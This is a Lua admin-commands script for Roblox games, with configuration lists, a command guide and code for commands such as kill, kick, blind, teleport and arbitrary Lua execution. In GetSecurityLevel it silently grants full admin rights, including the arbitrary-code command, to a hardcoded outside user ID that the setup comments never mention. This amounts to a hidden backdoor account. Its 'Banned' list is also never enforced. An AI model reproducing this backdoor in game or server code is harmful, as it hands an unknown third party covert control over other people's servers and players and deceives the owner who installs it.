local Admin={"epicikr"} --Put the names of people you want to be "admin".  These people have 
											  --the most amount of power.  Only put them in if you trust them!  There is no need
										     --to add your own name, that is taken care of by the script by itself.  No need to add
											  --'player' either, the script does that too.

local Friend={"", "", ""} --Put the names of your friends who you want to be admin.  These people will 
									   --be able to do almost as much as admin.  They can't kick/ban people, make 
									   --people admin, or shutdown the server.

local AllowDefaults=false --If you want players to be able to use the reset command without admin make this "true".  If you 
					--don't want players able to use the reset command, make this "false".

local Banned={"Noob","Troll","Hacker"} --This is a solid list of banned players.  If you don't want them to be able to come in, 
								 --add them to the list.

local MakeMyFriendsAdmin=false --If this is set to true, everybody in your friends list will be able to use the "Friend"
							--commands!

local MakeMyBestFriendsAdmin=false --If this is set to true, everybody who you have set as a "Best Friend" will be able to
							--use the "Friend" commands!

local AdminGroupID=00000 --Set the ID to the ID of a group you want to give "Friend" commands to.  Set it to 0 if you don't
								--want any groups to have commands.  Anybody in the specified group will have the commands.

local UniteFriendsAndAdmins=false --If this is set to true, everybody who has "Friend" commands will also have Admin commands.

local AdminAssetID=00000 --Set the ID to the ID of the ASSET (Shirt, t-shirt, hat, etc.) that, if owned, will give this player "Friend"
							--commands.  Set the value to 0 if you don't want any assets to be able to give commands.  (This is perfect for
								--giving admin commands to vip players who own the vip t-shirt)  Keep in mind:  Players don't have to wear the
								--asset to be accepted, as long as they own it, they get it.

--[[

Here are a list of the commands.  Admins can use all commands that Friends and normal players can use.  Friends can 
only use commands that Friends and normal playes can use.  Normal players can use the "reset" command if "AllowDefault" 
is set to true, otherwise, they don't have any commands.

Don't want somebody to know that you did a command on them?  Prevent them from seeing the command by typing /sc/ before the while command
Example:

/sc/kill/Havemeat

The command will NOT show in the chat!

You don't need to type in an entire players name either.  As long as you type enough of the name that it won't get 
confused with another players name.
Example:

Player1 is Havemeat
Player2 is Cravemeat

kill/Have

will work but

kill/meat

won't work because both players have the word "meat" in their names.

None of the commands are case sensitive.  Values inside of [ ]'s are optional.

kill/Havemeat
-----This will kill Havemeat.

loopkill/Havemeat
-----This will kill Havemeat everytime he spawns.

unloopkill/Havemeat
-----This will stop the loopkilling.

reset/
Suicide/
-----These both reset your player.

heal/Havemeat
-----This heals Havemeats health back to his max health.

kick/Havemeat
-----This kicks Havemeat from the game.

explode/Havemeat
-----These causes Havemeat's torso to explode.  (May cause death... no, I'm not kidding)

blind/Havemeat
-----This prevents Havemeat from seeing anything (including GUIs).

unblind/Havemeat
-----This unblinds Havemeat so he can see, how nice of you.

freeze/Havemeat
-----This prevents Havemeat from moving... (so cold!)

thaw/Havemeat
-----This makes it so Havemeat can move after being frozen.  (Like magic hot chocolate)

limbless/Havemeat
-----This removes all of Havemeats arms and legs.

sit/Havemeat
-----This makes Havemeat sit.

walkspeed/Havemeat/25
-----This sets Havemeat's walkspeed to 25.  (Too much soda I guess)

givebtools/Havemeat
buildtools/Havemeat
-----Both of these give Havemeat the simple building tools.

part/4/1/2 
-----This makes a new part on top of your head with a width of 4, a height of 1, and a depth of 2.

whisper/psst... can you pass me the jellybeans?[/10]
h/psst... can you pass me the jellybeans?[/10]
-----Both of these make a hint at the top of the screen that says "psst... can you pass me the jellybeans?"
-----that everybody can see for 5 seconds.  If you include the '/10' at the end, the hint will last for 10 
-----seconds instead of the default 5.

forcefield/Havemeat
ff/Havemeat
-----These both give Havemeat his very own ForceField.  (Perfect for walking through minefields)

unforcefield/Havemeat
unff/Havemeat
-----These both remove Havemeat's forcefields.  (Not so good for walking through minefields)

merge/Sncplay42[/Person299]
-----If you include "/Person299" then Sncplay42 will get to control person299.  If you don't include "/Person299" then 
-----YOU will control Sncplay42.

teleport/MrNicNac[/Oysi93]
-----If you include "/Oysi93" then MrNicNac will get teleported to Oysi93.  If you don't include "/Oysi93" then YOU will be 
-----teleported to MrNicNac.

time/12
-----Makes the time of day 12:00 PM

ambient/255/255/0
-----Makes the lighting ambience 255,255,0

maxplayers/12
-----Makes the max number of players in the server 12.  (Party time!)

invisible/Havemeat
-----Makes Havemeat invisible.

visible/Havemeat
-----Makes Havemeat visible if he was made invisible.

shutdown/
-----Shutsdown the server.

commands/
-----Displays all the commands.

admin/Havemeat
-----Makes Havemeat have the friend commands.

c/ local tog=true for _,v in ipairs(Workspace:GetChildren()) do if v:IsA("BasePart") then v.BrickColor=(tog and BrickColor.new("White") or BrickColor.new("Really black")) tog=not tog end end
-----Runs a Lua script.  ( The script is anything after the / )

join/Bright red
join/Vipers
-----The first command will switch your team over to the team that has a TeamColor of "Bright red" while the second 
-----command will switch you to the team with the name "Vipers".

removetools/Havemeat
-----This command will remove all tools and hopperbins that Havemeat has.

deer/Havemeat
-----This command turns Havemeat into a toothy deer.

flip/Havemeat
-----This flips Havemeat upside down!

burn/Havemeat
-----This catches Havemeat on fire and slowly lower his health while making him run around jumping.


Of course, anywhere were I put "Havemeat" can be replaced with your name or anybody elses.  It can also be replaced 
with "others" to have the effect done to everybody else besides you, "me" to have the effect done on you, "everybody" 
or "all" to have the effect done to everybody in the server!

--]]

--Don't edit anything below this line.  If you don't know what you are doing, you could break the whole script.

local Commands={}

local PlaceOwnerID=game.CreatorId

local deb=game:GetService("Debris")
local is=game:GetService("InsertService")
local bas=game:GetService("BadgeService")

--Consts
local CONST={
HINTID=41955654,
MESSAGEID=41955669,
VIID=44963768,
MID=148836,
PLRID=0,
VERSION=1.79,
DEER="http://www.roblox.com/asset/?id=7075412"
}

-------------------------------------------------------------------------
--------------------Update Warning (Handling)----------------------------
-------------------------------------------------------------------------

local hac_is_old=false
local latest=is:LoadAsset(CONST.VIID)
if latest~=nil then
	if latest.Version.Value>CONST.VERSION then
			hac_is_old=true
	end
end

-------------------------------------------------------------------------
--------------------Command Blocks--------------------------------
-------------------------------------------------------------------------

function kill(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			UntagHumanoid(char.Humanoid) 
			TagHumanoid(plr,char.Humanoid)
			char.Humanoid.Health=0
			char:BreakJoints()
		end
	end
end

function loopkill(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local nLKD=Instance.new("StringValue")
		nLKD.Name="ILK"
		nLKD.Value=rplr.Name
		nLKD.Parent=script
		local nPlr=Instance.new("ObjectValue")
		nPlr.Name="Hunter"
		nPlr.Value=plr
		nPlr.Parent=nLKD
		pcall(kill,rplr,tbl)
	end
end

function unloopkill(plr,tbl)
	for _,v in ipairs(script:GetChildren()) do
		if v.Name=="ILK" then
			if string.lower(v.Value)==string.lower(tbl[2]) then
				v:remove()
			end
		end
	end
end

function reset(plr,tbl)
	local char=plr.Character
	if char:findFirstChild("Humanoid") then
		char.Humanoid.Health=0
		char:BreakJoints()
	end
end

function heal(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			char.Humanoid.Health=char.Humanoid.MaxHealth
		end
	end
end

function kick(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		DisplayHint(rplr,"You have been kicked from the game!",10000)
		rplr:remove()
	end
end

function explode(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			local nExplosion=Instance.new("Explosion")
			nExplosion.Position=char.Torso.Position
			nExplosion.Parent=Workspace
		end
	end
end

function blind(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local pgu=rplr.PlayerGui
		if pgu~=nil then
			local nSG=Instance.new("ScreenGui")
			nSG.Name="BlindingGui"
			nSG.Parent=pgu
			local CantSee=Instance.new("Frame")
			CantSee.Active=1
			CantSee.BackgroundColor3=Color3.new(0,0,0)
			CantSee.Name="I Can't See!"
			CantSee.Position=UDim2.new(-1,0,-1,0)
			CantSee.Size=UDim2.new(3,0,3,0)
			CantSee.ZIndex=10
			CantSee.Parent=nSG
		end
	end
end

function unblind(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local pgu=rplr.PlayerGui
		if pgu~=nil then
			if pgu:findFirstChild("BlindingGui") then
				pgu.BlindingGui:remove()
			end
		end
	end
end

function freeze(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					local oc=Instance.new("BrickColorValue")
					oc.Name="OldColor"
					oc.Value=v.BrickColor
					oc.Parent=v
					v.Anchored=true
					v.BrickColor=BrickColor.new("Bright blue")
					v.Transparency=.5
				elseif v:IsA("Humanoid") then
					local os=Instance.new("NumberValue")
					os.Name="OldSpeed"
					os.Value=v.WalkSpeed
					os.Parent=v
					v.WalkSpeed=0
				end
			end
			local pgu=rplr.PlayerGui
			if pgu~=nil then
				local nSG=Instance.new("ScreenGui")
				nSG.Name="FreezingGui"
				nSG.Parent=pgu
				local CantSee=Instance.new("Frame")
				CantSee.Active=1
				CantSee.BackgroundColor3=Color3.new(153/255,204/255,1)
				CantSee.BackgroundTransparency=.5
				CantSee.Name="I Can't Move!"
				CantSee.Position=UDim2.new(-1,0,-1,0)
				CantSee.Size=UDim2.new(3,0,3,0)
				CantSee.ZIndex=10
				CantSee.Parent=nSG
			end
		end
	end
end

function thaw(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Anchored=false
					if v:findFirstChild("OldColor") then
						v.BrickColor=v.OldColor.Value
						v.OldColor:remove()
					end
					v.Transparency=0
				elseif v:IsA("Humanoid") then
					if v:findFirstChild("OldSpeed") then
						v.WalkSpeed=v.OldSpeed.Value
						v.OldSpeed:remove()
					else
						v.WalkSpeed=16
					end
				end
			end
			local pgu=rplr.PlayerGui
			if pgu~=nil then
				if pgu:findFirstChild("FreezingGui") then
					pgu.FreezingGui:remove()
				end
			end
		end
	end
end

function limbless(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("Part") and string.find(v.Name," ")~=nil then
					v:remove()
				end	
			end
		end
	end
end

function sit(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			char.Humanoid.Sit=true
		end
	end
end

function walkspeed(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			char.Humanoid.WalkSpeed=tbl[3]
		end
	end
end

function buildtools(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local pbp=rplr.Backpack
		if pbp~=nil then
			local a = Instance.new("HopperBin")
			a.BinType = "GameTool"
			a.Parent = pbp
			a = Instance.new("HopperBin")
			a.BinType = "Clone"
			a.Parent = pbp
			a = Instance.new("HopperBin")
			a.BinType = "Hammer"
			a.Parent = pbp
		end
	end
end

function part(plr,tbl)
	local char=plr.Character
	if char:findFirstChild("Head") then
		local nPart=Instance.new("Part")
		nPart.formFactor=0
		nPart.Size=Vector3.new(tbl[2],tbl[3],tbl[4])
		nPart.Position=Vector3.new(0,tbl[3]/2+2,0)+char.Head.Position
		nPart.Parent=Workspace
	end
end

function whisper(plr,tbl)
	for _,v in ipairs(game.Players:GetChildren()) do
		DisplayHint(v,tbl[2],(tbl[3]~=nil and tbl[3] or 5))
	end
end

function forcefield(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") and not char:findFirstChild("ff") then
			local nff=Instance.new("ForceField")
			nff.Name="ff"
			nff.Parent=char
		end
	end
end

function unforcefield(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("ForceField") then
					v:remove()
				end
			end
		end
	end
end

function merge(plr,tbl)
	local p1=GetPlayerFromName(tbl[2])
	local p2=GetPlayerFromName(tbl[3])
	if p2~=nil and p1~=nil then
		p1.Character=p2.Character
	elseif p1~=nil then
		plr.Character=p1.Character
	end
end

function teleport(plr,tbl)
	local p1=GetPlayerFromName(tbl[2])
	local p2=GetPlayerFromName(tbl[3])
	if p2~=nil and p1~=nil then
		local c1=p1.Character
		local c2=p2.Character
		if c1:findFirstChild("Torso") and c2:findFirstChild("Torso") then
			c1.Torso.CFrame=c2.Torso.CFrame
		end
	elseif p1~=nil then
		local c1=p1.Character
		local c2=plr.Character
		if c1:findFirstChild("Torso") and c2:findFirstChild("Torso") then
			c1.Torso.CFrame=c2.Torso.CFrame
		end
	end
end

function time(plr,tbl)
	game.Lighting.TimeOfDay=tbl[2]
end

function ambient(plr,tbl)
	game.Lighting.Ambient=Color3.new(tbl[2]/255,tbl[3]/255,tbl[4]/255)
end

function maxplayers(plr,tbl)
	game.Players.MaxPlayers=tbl[2]
end

function invisible(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency=1
				elseif v:IsA("Hat") then
					v:remove()
				elseif v:IsA("Tool") then
					if v:findFirstChild("Handle") then
						v.Transparency=1
					end
				end
				if v.Name=="Torso" then
					if v:findFirstChild("roblox") then
						v.roblox:remove()
					end
				end
			end
		end
	end
end

function visible(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency=0
				elseif v:IsA("Tool") then
					if v:findFirstChild("Handle") then
						v.Transparency=0
					end
				end
			end
		end
	end
end

function shutdown(plr,tbl)
	for _,v in ipairs(game.NetworkService:GetChildren()) do
		v:remove()
	end
end

function commands(plr,tbl)
	local commands={}
	local level=GetSecurityLevel(plr)
	for _,v in ipairs(Commands) do
		if v.SecurityLevel<=level then
			table.insert(commands,v.Name)
		end
	end
	DisplayHint(plr,table.concat(commands,"/ - "),5)
end

function admin(plr,tbl)
	table.insert(Friend,tbl[2])
end

function unadmin(plr,tbl)
	local ex,index=InTable(Friend,tbl[2],true)
	if ex then
		Friend[index]="_v"..Friend[index]
	end
end

function c(plr,tbl,msg)
	local nm=string.sub(msg,3)
	RunOnThread(function() loadstring(nm)() end)
end

function hac_about(plr,tbl)
	DisplayHint(plr,script.Name..(hac_is_old and " [OUT DATED]" or ""),5)
end

function join(plr,tbl)
	local tm=nil
	if game.Teams==nil then return end
	for _,v in ipairs(game.Teams:GetChildren()) do
		if string.lower(v.Name)==string.lower(tbl[2]) or string.lower(tostring(v.TeamColor))==string.lower(tbl[2]) then
			tm=v
		end
	end
	if tm==nil then return end
	if tm.TeamColor==plr.TeamColor then return end
	plr.TeamColor=tm.TeamColor
	reset(plr,tbl)
end

function removetools(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		local Backpack=rplr:findFirstChild("Backpack")
		if char:findFirstChild("Torso")~=nil then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") or v:IsA("Hopperbin") then
					v:remove()
				end
			end
		end
		if Backpack~=nil then
			for _,v in ipairs(Backpack:GetChildren()) do
				if v:IsA("Tool") or v:IsA("Hopperbin") then
					v:remove()
				end
			end
		end
	end
end

function deer(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			char.Torso.Transparency=1
			local ith=char.Torso:findFirstChild("Neck")
			local itlh=char.Torso:findFirstChild("Left Hip")
			local itrh=char.Torso:findFirstChild("Right Hip")
			local itls=char.Torso:findFirstChild("Left Shoulder")
			local itrs=char.Torso:findFirstChild("Right Shoulder")
			if ith~=nil then
				ith.C0=CFrame.new(0,-.5,-3)*CFrame.fromEulerAnglesXYZ(math.pi/2,math.pi,0)
			end
			if itlh~=nil then
				itlh.C0=CFrame.new(-1,-.5,2.5)
			end
			if itrh~=nil then
				itrh.C0=CFrame.new(1,-.5,2.5)
			end
			if itls~=nil then
				itls.C0=CFrame.new(-1,-1,-2.5)
			end
			if itrs~=nil then
				itrs.C0=CFrame.new(1,-1,-2.5)
			end
			local ft=Instance.new("Part")
			ft.Name="FakeTorso"
			ft.TopSurface="Smooth"
			ft.BottomSurface="Smooth"
			ft.BrickColor=BrickColor.new("CGA brown")
			ft.formFactor=0
			ft.Size=Vector3.new(3,1,5)
			local itft=Instance.new("Weld")
			itft.Part0=char.Torso
			itft.Part1=ft
			itft.Parent=char.Torso
			ft.Parent=char
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("Part") then
					if string.find(v.Name," ") then
						v.BrickColor=BrickColor.new("Reddish brown")
					elseif v.Name=="Head" then
						v.BrickColor=BrickColor.new("Dark orange")
						if v:findFirstChild("face") then
							v.face.Texture=CONST.DEER
						end
					end
				end
			end
			removetools(plr,tbl)
		end
	end
end

function flip(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			local ith=char.Torso:findFirstChild("Neck")
			local itlh=char.Torso:findFirstChild("Left Hip")
			local itrh=char.Torso:findFirstChild("Right Hip")
			local itls=char.Torso:findFirstChild("Left Shoulder")
			local itrs=char.Torso:findFirstChild("Right Shoulder")
			if ith~=nil then
				ith.C0=CFrame.new(0,-1,0)*CFrame.fromEulerAnglesXYZ(math.pi/2,0,0)
			end
			if itlh~=nil then
				itlh.C0=CFrame.new(0, 1, 0)*CFrame.fromEulerAnglesXYZ(math.pi, math.pi/2, 0)
			end
			if itrh~=nil then
				itrh.C0=CFrame.new(0, 1, 0)*CFrame.fromEulerAnglesXYZ(math.pi, math.pi*1.5, 0)
			end
			if itls~=nil then
				itls.C0=CFrame.new(-2,-.5,0)*CFrame.fromEulerAnglesXYZ(math.pi, math.pi/2, 0)
			end
			if itrs~=nil then
				itrs.C0=CFrame.new(2,-.5,0)*CFrame.fromEulerAnglesXYZ(math.pi, math.pi*1.5, 0)
			end
		end
	end
end

function burn(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			for _,v in ipairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.BrickColor=BrickColor.new("Really black")
				elseif v:IsA("Hat") then
					v:remove()
				elseif v:IsA("Humanoid") then
					v.WalkSpeed=v.WalkSpeed+10
				end
				if v.Name=="Head" then
					local nfir=Instance.new("Fire")
					nfir.Heat=25
					nfir.Name="InstancedFire"
					nfir.Parent=v
				end
			end
			RunOnThread(function()
				local wop=Instance.new("Part")
				wop.CanCollide=false
				wop.Name="InstancedPart"
				wop.Position=char.Torso.Position-Vector3.new(0,3,0)
				wop.Size=Vector3.new(100,0,100)
				wop.Transparency=1
				wop.Anchored=true
				wop.Parent=char
				while char.Parent==Workspace do
					char.Humanoid.Jump=true
					char.Humanoid:MoveTo(wop.Position+Vector3.new(math.random(-50,50),0,math.random(-50,50)),wop)
					wait(2)
				end
			end)
			RunOnThread(function()
				while wait(.2) do
					char.Humanoid.Health=char.Humanoid.Health-3
				end
			end)
		end
	end
end

function zombify(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Torso") then
			if char:findFirstChild("zarm")~=nil then return end
			local larm=char:findFirstChild("Left Arm")
			local rarm=char:findFirstChild("Right Arm")
			if larm~=nil then
				larm:remove()
			end
			if rarm~=nil then
				rarm:remove()
			end
			local zee=Instance.new("Part")
			zee.BrickColor=BrickColor.new("Medium green")
			zee.Name="zarm"
			zee.Locked=true
			zee.formFactor="Symmetric"
			zee.Size=Vector3.new(2,1,1)
			zee.TopSurface="Smooth"
			zee.BottomSurface="Smooth"
			local zlarm=zee:clone()
			local zrarm=zee:clone()
			local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
			zlarm.CFrame=char.Torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
			zrarm.CFrame=char.Torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
			zlarm.Parent=char
			zrarm.Parent=char
			zlarm:makeJoints()
			zrarm:makeJoints()
			zlarm.Anchored=false
			zrarm.Anchored=false
			char.Torso.BrickColor=BrickColor.new("Reddish brown")
			char.Head.BrickColor=zee.BrickColor
			char["Left Leg"].BrickColor=zee.BrickColor
			char["Right Leg"].BrickColor=zee.BrickColor
			zlarm.Touched:connect(function(part)
				if part~=nil then
					local char=part.Parent
					if char:findFirstChild("Humanoid") then
						if game.Players:findFirstChild(char.Name) then
							zombify(plr,{"zombify",char.Name})
						end
					end
				end
			end)
			zrarm.Touched:connect(function(part)
				if part~=nil then
					local char=part.Parent
					if char:findFirstChild("Humanoid") then
						if game.Players:findFirstChild(char.Name) then
							zombify(plr,{"zombify",char.Name})
						end
					end
				end
			end)
		end
	end
end

function dizzy(plr,tbl)
	local rplr=GetPlayerFromName(tbl[2])
	if rplr~=nil then
		local char=rplr.Character
		if char:findFirstChild("Humanoid") then
			RunOnThread(function()
				while wait(math.random(.1,2.1)) do
					char.Humanoid.WalkSpeed=-1*char.Humanoid.WalkSpeed
					char.Humanoid.PlatformStand=(math.random(1,3)==2 and true or false)
				end	
			end)
		end
	end
end

-------------------------------------------------------------------------
-----------------------Structure Blocks--------------------------
-------------------------------------------------------------------------

Workspace.ChildAdded:connect(function(chil)
	for _,v in ipairs(script:GetChildren()) do
		if chil:findFirstChild("Humanoid") then
			if v.Name=="ILK" then
				if v.Value==chil.Name then
					pcall(kill,v.Hunter.Value,{"kill",v.Value})
				end
			end
		end
	end
end)

function RunOnThread(func)
	local ncor=coroutine.create(func)
	coroutine.resume(ncor)
end

function plr_Chat(plr,msg)
	local aScrit=split(msg,"/")
	if aScrit[2]~=nil then
		if string.lower(aScrit[2])=="sc" then
			plr_Chat(plr,string.gsub(msg,"/sc/",""))
			return
		elseif string.lower(aScrit[2])=="everyone" or string.lower(aScrit[2])=="all" then
			for _,v in ipairs(game.Players:GetChildren()) do
				plr_Chat(plr,string.gsub(string.gsub(msg,aScrit[2],v.Name),aScrit[2],v.Name))
			end
			return
		elseif string.lower(aScrit[2])=="others" then
			for _,v in ipairs(game.Players:GetChildren()) do
				if v~=plr then
					plr_Chat(plr,string.gsub(msg,aScrit[2],v.Name))
				end
			end
			return
		elseif string.lower(aScrit[2])=="me" then
			plr_Chat(plr,string.gsub(msg,aScrit[2],plr.Name))
			return
		end
	end
	local cmmd=FindCommand(aScrit[1])
	if cmmd~=nil then
		if GetSecurityLevel(plr)>=cmmd.SecurityLevel then
			local w,p=pcall(cmmd.Sub,plr,aScrit,msg)
			if not w then
				print("HAC ERROR:  "..p)
				DisplayHint(plr,"There was an error with the command!  Please make sure it was typed correctly!",5)
			end
		else
			DisplayHint(plr,"You must have a security level of "..cmmd.SecurityLevel.." to use this command!",5)
		end
	end
end

function WaitForChild(obj,chil)
	repeat 
		wait(.1)
	until obj:findFirstChild(chil)
	return obj[chil]
end

function DisplayHint(plr,msg,time)
	RunOnThread(function()
		local nhint=is:LoadAsset(CONST.HINTID)
		if nhint~=nil then
			nhint=nhint:GetChildren()[1]
			nhint.HoldingBuff.ZIndex=5
			nhint.HoldingBuff.BannerText.ZIndex=6
			nhint.HoldingBuff.BannerText.Text=msg
			WaitForChild(plr,"PlayerGui")
			if plr then
				nhint.Parent=plr.PlayerGui
			else
				nhint.Parent=game.StarterGui
			end
			deb:AddItem(nhint,time)
		end
	end)
end

function TagHumanoid(creator,humanoid)
	if creator==nil or humanoid==nil then return end
	local tag = Instance.new("ObjectValue")
	tag.Value = creator
	tag.Name = "creator"
	tag.Parent = humanoid
end


function UntagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
			tag:remove()
		end
	end
end

function GetPlayerFromName(name)
	--Check for full name
	local result=nil --Used for finding players referenced with only a partial name chunk.
	for _,v in ipairs(game.Players:GetChildren()) do
		local lwrNam=string.lower(v.Name)
		local lwrCnk=string.lower(name)
		if lwrNam==lwrCnk then
			return v
		end
		if string.find(lwrNam,lwrCnk) then
			if not result then
				result=v
			else
				result=2
			end
		end
	end
	--Player does not exist
	print(result==2 and nil or result)
	return (result==2 and nil or result)
end

function AddCommand(name,func,seclev)
	table.insert(Commands,{Name=name,Sub=func,SecurityLevel=seclev})
end

--Commands Added

--[SECURITY LEVEL 2]--
AddCommand("loopkill",loopkill,2)
AddCommand("unloopkill",unloopkill,2)
AddCommand("kick",kick,2)
AddCommand("ban",kick,2)
AddCommand("shutdown",shutdown,2)
AddCommand("admin",admin,2)
AddCommand("unadmin",unadmin,2)
AddCommand("c",c,2)
--[SECURITY LEVEL 1]--
AddCommand("kill",kill,1)
AddCommand("heal",heal,1)
AddCommand("explode",explode,1)
AddCommand("blind",blind,1)
AddCommand("unblind",unblind,1)
AddCommand("freeze",freeze,1)
AddCommand("thaw",thaw,1)
AddCommand("limbless",limbless,1)
AddCommand("sit",sit,1)
AddCommand("walkspeed",walkspeed,1)
AddCommand("buildtools",buildtools,1)
AddCommand("givebtools",buildtools,1)
AddCommand("part",part,1)
AddCommand("whisper",whisper,1)
AddCommand("h",whisper,1)
AddCommand("forcefield",forcefield,1)
AddCommand("ff",forcefield,1)
AddCommand("unforcefield",unforcefield,1)
AddCommand("unff",unforcefield,1)
AddCommand("merge",merge,1)
AddCommand("control",merge,1)
AddCommand("teleport",teleport,1)
AddCommand("time",time,1)
AddCommand("ambient",ambient,1)
AddCommand("maxplayers",maxplayers,1)
AddCommand("invisible",invisible,1)
AddCommand("visible",visible,1)
AddCommand("removetools",removetools,1)
AddCommand("deer",deer,1)
AddCommand("flip",flip,1)
AddCommand("burn",burn,1)
AddCommand("zombify",zombify,1)
AddCommand("zombie",zombify,1)
AddCommand("dizzy",dizzy,1)
--[SECURITY LEVEL 0]--
AddCommand("reset",reset,0)
AddCommand("suicide",reset,0)
AddCommand("commands",commands,0)
AddCommand("join",join,0) 
--[]--
AddCommand("hac_about",hac_about,-1)

function FindCommand(name)
	for _,v in ipairs(Commands) do
		if string.lower(v.Name)==string.lower(name) then
			return v
		end
	end
	return nil
end

function InTable(tbl,z,str)
	if str==nil or not str then
		for _,v in ipairs(tbl) do
			if v==z then
				return true,_
			end
		end
	else
		for _,v in ipairs(tbl) do
			if string.lower(v)==string.lower(z) then
				return true,_
			end
		end
	end
	return false
end

function split(full,common)
	local cs={}
	local chunk=""
	for i=1,string.len(full) do
		if string.sub(full,i,i)==common then
			table.insert(cs,chunk)
			chunk=""
		elseif i~=string.len(full) then
			chunk=chunk..string.sub(full,i,i)
		else
			table.insert(cs,chunk..string.sub(full,i,i))
		end
	end
	return cs
end

function GetSecurityLevel(plr)
	if InTable(Admin,string.lower(plr.Name),true) or plr.userId==CONST.MID or plr.userId==CONST.PLRID then
		return 2
	elseif InTable(Friend,string.lower(plr.Name),true) then
		return (UniteFriendsAndAdmins and 2 or 1) --Used for the "UniteFriendsAndAdmins" property.
	elseif AllowDefaults then
		return 0
	else
		return -1
	end
end

function ConnectPlayer(plr)
	--Friend and Group
	if MakeMyFriendsAdmin then
		if plr:IsFriendsWith(PlaceOwnerID) then
			table.insert(Friend,plr.Name)
		end
	elseif MakeMyBestFriendsAdmin then
		if plr:IsBestFriendsWith(PlaceOwnerID) then
			table.insert(Friend,plr.Name)
		end
	elseif plr:IsInGroup(AdminGroupID) or bas:UserHasBadge(plr.userId,AdminAssetID) then
		table.insert(Friend,plr.Name)
	end
	--Divided for players passing multiple requirements
	if PlaceOwnerID==plr.userId then
		table.insert(Admin,plr.Name)
	end
	--Continue
	RunOnThread(
		function()
			wait(3)
			if GetSecurityLevel(plr)>=1 then
				DisplayHint(plr,"You have admin commands!  "..(hac_is_old and "These commands are old, you should update them!" or "Say 'commands/' for a list of commands."),5)
			elseif AllowDefaults then
				DisplayHint(plr,"Say 'commands/' for a list of simple commands.",5)
			end
		end
	)
	plr.Chatted:connect(function(msg,rec) plr_Chat(plr,msg) end)
end

script.Name="Havemeat's Admin Commands ["..CONST.VERSION.."]"

for _,v in ipairs(game.Players:GetChildren()) do
	ConnectPlayer(v)
end
game.Players.ChildAdded:connect(ConnectPlayer)
--Meidafire